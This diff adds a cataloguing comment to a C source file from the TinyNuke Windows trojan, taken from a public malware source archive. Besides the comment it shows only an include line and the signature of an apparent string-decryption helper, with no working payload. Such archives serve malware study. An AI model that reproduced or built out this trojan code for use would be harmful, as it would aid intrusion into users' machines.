@@ -1,3 +1,14 @@
+/*
+  name      TinyNuke
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     —
+ */
 #include "Utils.h"
 
 char *UnEnc(char *enc, char *key, DWORD encLen)
